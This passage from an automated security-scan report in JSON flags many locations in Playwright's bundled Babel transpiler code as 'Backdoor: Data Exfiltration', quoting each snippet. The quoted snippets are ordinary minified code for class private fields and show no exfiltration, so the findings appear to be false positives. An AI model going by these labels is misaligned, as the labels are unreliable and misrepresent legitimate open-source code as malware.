                      "text": ".cloneNode(o),this.receiver(e),t]):N.types.callExpression(s.addHelper(\"classPrivateFieldSet\"),[this.receiver(e),N.types.cloneNode(o),t])},destructureSet(e){let{classRef:t,privateNamesMap:r,file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.recei",
                      "markdown": "`.cloneNode(o),this.receiver(e),t]):N.types.callExpression(s.addHelper(\"classPrivateFieldSet\"),[this.receiver(e),N.types.cloneNode(o),t])},destructureSet(e){let{classRef:t,privateNamesMap:r,file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.recei`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 3067,
                  "endLine": 1779,
                  "endColumn": 3072,
                  "snippet": {
                    "text": "t(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticPrivateFieldSpecSet\";return N.types.callExpression(s.addHelper(d),[this.receiver(e),N.types.cloneNode(r),N.types.cloneNode(o),t])}let m=this.receiver(e),b=N.types.isIdentifier(m)&&m.name===r.name;if(u&&!c){let d=Qf(s,a)",
                    "rendered": {
                      "text": "t(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticPrivateFieldSpecSet\";return N.types.callExpression(s.addHelper(d),[this.receiver(e),N.types.cloneNode(r),N.types.cloneNode(o),t])}let m=this.receiver(e),b=N.types.isIdentifier(m)&&m.name===r.name;if(u&&!c){let d=Qf(s,a)",
                      "markdown": "`t(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticPrivateFieldSpecSet\";return N.types.callExpression(s.addHelper(d),[this.receiver(e),N.types.cloneNode(r),N.types.cloneNode(o),t])}let m=this.receiver(e),b=N.types.isIdentifier(m)&&m.name===r.name;if(u&&!c){let d=Qf(s,a)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 2849,
                  "endLine": 1779,
                  "endColumn": 2854,
                  "snippet": {
                    "text": "]):ar(n)?N.types.callExpression(n.addHelper(\"classPrivateFieldGet2\"),[N.types.cloneNode(o),this.receiver(e)]):N.types.callExpression(n.addHelper(\"classPrivateFieldGet\"),[this.receiver(e),N.types.cloneNode(o)])},boundGet(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticP",
                    "rendered": {
                      "text": "]):ar(n)?N.types.callExpression(n.addHelper(\"classPrivateFieldGet2\"),[N.types.cloneNode(o),this.receiver(e)]):N.types.callExpression(n.addHelper(\"classPrivateFieldGet\"),[this.receiver(e),N.types.cloneNode(o)])},boundGet(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticP",
                      "markdown": "`]):ar(n)?N.types.callExpression(n.addHelper(\"classPrivateFieldGet2\"),[N.types.cloneNode(o),this.receiver(e)]):N.types.callExpression(n.addHelper(\"classPrivateFieldGet\"),[this.receiver(e),N.types.cloneNode(o)])},boundGet(e){return this.memoise(e,1),N.types.callExpression(N.types.memberExpression(this.get(e),N.types.identifier(\"bind\")),[this.receiver(e)])},set(e,t){let{classRef:r,privateNamesMap:n,file:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,setId:c,getId:f}=n.get(a),p=f||c;if(l){if(!ar(s)){let d=u&&!p?\"classStaticPrivateMethodSet\":\"classStaticP`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 1104,
                  "endLine": 1779,
                  "endColumn": 1109,
                  "snippet": {
                    "text": "(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMethodGet\":\"classStaticPrivateFieldSpecGet\";return N.types.callExpression(n.addHelper(y),[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(o)])}let b=this.receiver(e),d=N.types.isIdentifier(b)&&b.name===t.name;if(!",
                    "rendered": {
                      "text": "(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMethodGet\":\"classStaticPrivateFieldSpecGet\";return N.types.callExpression(n.addHelper(y),[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(o)])}let b=this.receiver(e),d=N.types.isIdentifier(b)&&b.name===t.name;if(!",
                      "markdown": "`(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMethodGet\":\"classStaticPrivateFieldSpecGet\";return N.types.callExpression(n.addHelper(y),[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(o)])}let b=this.receiver(e),d=N.types.isIdentifier(b)&&b.name===t.name;if(!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 888,
                  "endLine": 1779,
                  "endColumn": 893,
                  "snippet": {
                    "text": "definedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMetho",
                    "rendered": {
                      "text": "definedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMetho",
                      "markdown": "`definedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.memoiser.has(t)?N.types.cloneNode(this.memoiser.get(t)):N.types.cloneNode(t)},get(e){let{classRef:t,privateNamesMap:r,file:n,innerBinding:s,noUninitializedPrivateFieldAccess:i}=this,{name:a}=e.node.property.id,{id:o,static:l,method:u,methodId:c,getId:f,setId:p}=r.get(a),m=f||p;if(l){if(qO(t.name,e.scope,s),!ar(n)){let y=u&&!m?\"classStaticPrivateMetho`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 36,
                  "endLine": 1779,
                  "endColumn": 41,
                  "snippet": {
                    "text": "clared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template.expression.ast`${N.types.cloneNode(u)}.has(${ep(s,t)})`)}});function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}`",
                    "rendered": {
                      "text": "clared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template.expression.ast`${N.types.cloneNode(u)}.has(${ep(s,t)})`)}});function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}`",
                      "markdown": "`clared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template.expression.ast`${N.types.cloneNode(u)}.has(${ep(s,t)})`)}});function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}``"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 3477,
                  "endLine": 1777,
                  "endColumn": 3482,
                  "snippet": {
                    "text": "BinaryExpression(e,{file:t}){let{operator:r,left:n,right:s}=e.node;if(r!==\"in\"||!N.types.isPrivateName(n))return;let{privateFieldsAsProperties:i,privateNamesMap:a,redeclared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template",
                    "rendered": {
                      "text": "BinaryExpression(e,{file:t}){let{operator:r,left:n,right:s}=e.node;if(r!==\"in\"||!N.types.isPrivateName(n))return;let{privateFieldsAsProperties:i,privateNamesMap:a,redeclared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template",
                      "markdown": "`BinaryExpression(e,{file:t}){let{operator:r,left:n,right:s}=e.node;if(r!==\"in\"||!N.types.isPrivateName(n))return;let{privateFieldsAsProperties:i,privateNamesMap:a,redeclared:o}=this,{name:l}=n.id;if(!a.has(l)||o&&o.includes(l))return;if(qO(this.classRef.name,e.scope,this.innerBinding),i){let{id:f}=a.get(l);e.replaceWith(N.template.expression.ast`\n        Object.prototype.hasOwnProperty.call(${ep(s,t)}, ${N.types.cloneNode(f)})\n      `);return}let{id:u,static:c}=a.get(l);if(c){e.replaceWith(N.template.expression.ast`${ep(s,t)} === ${N.types.cloneNode(this.classRef)}`);return}e.replaceWith(N.template`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 2483,
                  "endLine": 1777,
                  "endColumn": 2488,
                  "snippet": {
                    "text": " ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({PrivateName(e,{noDocumentAll:t}){let{privateNamesMap:r,redeclared:n}=this,{node:s,parentPath:i}=e;if(!i.isMemberExpression({property:s})&&!i.i",
                    "rendered": {
                      "text": " ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({PrivateName(e,{noDocumentAll:t}){let{privateNamesMap:r,redeclared:n}=this,{node:s,parentPath:i}=e;if(!i.isMemberExpression({property:s})&&!i.i",
                      "markdown": "` ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({PrivateName(e,{noDocumentAll:t}){let{privateNamesMap:r,redeclared:n}=this,{node:s,parentPath:i}=e;if(!i.isMemberExpression({property:s})&&!i.i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 2344,
                  "endLine": 1777,
                  "endColumn": 2349,
                  "snippet": {
                    "text": "wExpression(N.types.identifier(u&&(!p||ar(n))?\"WeakSet\":\"WeakMap\"),[])}b&&(r||(0,vbe.default)(b),s.push(N.template.statement.ast`var ${m} = ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({Pri",
                    "rendered": {
                      "text": "wExpression(N.types.identifier(u&&(!p||ar(n))?\"WeakSet\":\"WeakMap\"),[])}b&&(r||(0,vbe.default)(b),s.push(N.template.statement.ast`var ${m} = ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({Pri",
                      "markdown": "`wExpression(N.types.identifier(u&&(!p||ar(n))?\"WeakSet\":\"WeakMap\"),[])}b&&(r||(0,vbe.default)(b),s.push(N.template.statement.ast`var ${m} = ${b}`))}return s}function xE(e){let t=N.traverse.visitors.merge([Object.assign({},e),RO.default]),r=Object.assign({},e,{Class(n){let{privateNamesMap:s}=this,i=n.get(\"body.body\"),a=new Map(s),o=[];for(let l of i){if(!l.isPrivate())continue;let{name:u}=l.node.key.id;a.delete(u),o.push(u)}o.length&&(n.get(\"body\").traverse(t,Object.assign({},this,{redeclared:o})),n.traverse(r,Object.assign({},this,{privateNamesMap:a})),n.skipKey(\"body\"))}});return r}var Abe=xE({Pri`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 521,
                  "endLine": 1777,
                  "endColumn": 526,
                  "snippet": {
                    "text": "s=Pbe;_s.privateNameVisitorFactory=xE;_s.transformPrivateNamesUsage=Obe;var N=Et(),bbe=Xf(),RO=cs(),Ebe=pE(),FO=hE(),vbe=zf(),Tbe=Jf(),Sbe=vE();ar=e=>e.availableHelper(\"classPrivateFieldGet2\");var ar;function xbe(e,t,r,n){let s=new Map,i;for(let o of r)if(o.isPrivate()){let{name:l}=o.node.key.id,u=s.get(l);if(!u){let c=!o.isProperty(),f=o.node.static,p=!1,m;if(!t&&ar(n)&&c&&!f){var a;p=!!i,(a=i)!=null||(i=o.scope.generateUidIdentifier(`${e}_brand`)),m=i}else m=o.scope.generateUidIdentifier(l);u={id:m,static:f,method:c,initAdded:p},s.set(l,u)}if(o.isClassPrivateMethod())if(o.node.kind===\"get\"){let{b",
                    "rendered": {
                      "text": "s=Pbe;_s.privateNameVisitorFactory=xE;_s.transformPrivateNamesUsage=Obe;var N=Et(),bbe=Xf(),RO=cs(),Ebe=pE(),FO=hE(),vbe=zf(),Tbe=Jf(),Sbe=vE();ar=e=>e.availableHelper(\"classPrivateFieldGet2\");var ar;function xbe(e,t,r,n){let s=new Map,i;for(let o of r)if(o.isPrivate()){let{name:l}=o.node.key.id,u=s.get(l);if(!u){let c=!o.isProperty(),f=o.node.static,p=!1,m;if(!t&&ar(n)&&c&&!f){var a;p=!!i,(a=i)!=null||(i=o.scope.generateUidIdentifier(`${e}_brand`)),m=i}else m=o.scope.generateUidIdentifier(l);u={id:m,static:f,method:c,initAdded:p},s.set(l,u)}if(o.isClassPrivateMethod())if(o.node.kind===\"get\"){let{b",
                      "markdown": "`s=Pbe;_s.privateNameVisitorFactory=xE;_s.transformPrivateNamesUsage=Obe;var N=Et(),bbe=Xf(),RO=cs(),Ebe=pE(),FO=hE(),vbe=zf(),Tbe=Jf(),Sbe=vE();ar=e=>e.availableHelper(\"classPrivateFieldGet2\");var ar;function xbe(e,t,r,n){let s=new Map,i;for(let o of r)if(o.isPrivate()){let{name:l}=o.node.key.id,u=s.get(l);if(!u){let c=!o.isProperty(),f=o.node.static,p=!1,m;if(!t&&ar(n)&&c&&!f){var a;p=!!i,(a=i)!=null||(i=o.scope.generateUidIdentifier(`${e}_brand`)),m=i}else m=o.scope.generateUidIdentifier(l);u={id:m,static:f,method:c,initAdded:p},s.set(l,u)}if(o.isClassPrivateMethod())if(o.node.kind===\"get\"){let{b`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1773,
                  "startColumn": 2210,
                  "endLine": 1773,
                  "endColumn": 2215,
                  "snippet": {
                    "text": "sparentExprWrappers=cbe;var nbe=De(),{isParenthesizedExpression:sbe,isTSAsExpression:ibe,isTSNonNullExpression:abe,isTSSatisfiesExpression:obe,isTSTypeAssertion:lbe,isTypeCastExpression:ube}=nbe;function gE(e){return ibe(e)||obe(e)||lbe(e)||abe(e)||ube(e)||sbe(e)}function cbe(e){for(;gE(e.node);)e=e.get(\"expression\");return e}function fbe(e){for(;gE(e);)e=e.expression;return e}});var zf=E(bE=>{\"use strict\";Object.defineProperty(bE,\"__esModule\",{value:!0});bE.default=ybe;var pbe=De(),{addComment:dbe}=pbe,hbe=\"#__PURE__\",mbe=({leadingComments:e})=>!!e&&e.some(t=>/[@#]__PURE__/.test(t.value));function",
                    "rendered": {
                      "text": "sparentExprWrappers=cbe;var nbe=De(),{isParenthesizedExpression:sbe,isTSAsExpression:ibe,isTSNonNullExpression:abe,isTSSatisfiesExpression:obe,isTSTypeAssertion:lbe,isTypeCastExpression:ube}=nbe;function gE(e){return ibe(e)||obe(e)||lbe(e)||abe(e)||ube(e)||sbe(e)}function cbe(e){for(;gE(e.node);)e=e.get(\"expression\");return e}function fbe(e){for(;gE(e);)e=e.expression;return e}});var zf=E(bE=>{\"use strict\";Object.defineProperty(bE,\"__esModule\",{value:!0});bE.default=ybe;var pbe=De(),{addComment:dbe}=pbe,hbe=\"#__PURE__\",mbe=({leadingComments:e})=>!!e&&e.some(t=>/[@#]__PURE__/.test(t.value));function",
                      "markdown": "`sparentExprWrappers=cbe;var nbe=De(),{isParenthesizedExpression:sbe,isTSAsExpression:ibe,isTSNonNullExpression:abe,isTSSatisfiesExpression:obe,isTSTypeAssertion:lbe,isTypeCastExpression:ube}=nbe;function gE(e){return ibe(e)||obe(e)||lbe(e)||abe(e)||ube(e)||sbe(e)}function cbe(e){for(;gE(e.node);)e=e.get(\"expression\");return e}function fbe(e){for(;gE(e);)e=e.expression;return e}});var zf=E(bE=>{\"use strict\";Object.defineProperty(bE,\"__esModule\",{value:!0});bE.default=ybe;var pbe=De(),{addComment:dbe}=pbe,hbe=\"#__PURE__\",mbe=({leadingComments:e})=>!!e&&e.some(t=>/[@#]__PURE__/.test(t.value));function`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1773,
                  "startColumn": 604,
                  "endLine": 1773,
                  "endColumn": 609,
                  "snippet": {
                    "text": "(\"Object\"),ml(\"prototype\"))}return Aa(i,s,n)},set(e,t){let{computed:r}=e.node,n=this.prop(e);return Qge(\"=\",Aa(yl(),n,r),t)},destructureSet(e){let{computed:t}=e.node,r=this.prop(e);return Aa(yl(),r,t)},call(e,t){return(0,Yf.default)(this.get(e),yl(),t,!1)},optionalCall(e,t){return(0,Yf.default)(this.get(e),yl(),t,!0)}}),yE=class{constructor(t){var r;let n=t.methodPath;this.methodPath=n,this.isDerivedConstructor=n.isClassMethod({kind:\"constructor\"})&&!!t.superRef,this.isStatic=n.isObjectMethod()||n.node.static||(n.isStaticBlock==null?void 0:n.isStaticBlock()),this.isPrivateMethod=n.isPrivate()&&n.is",
                    "rendered": {
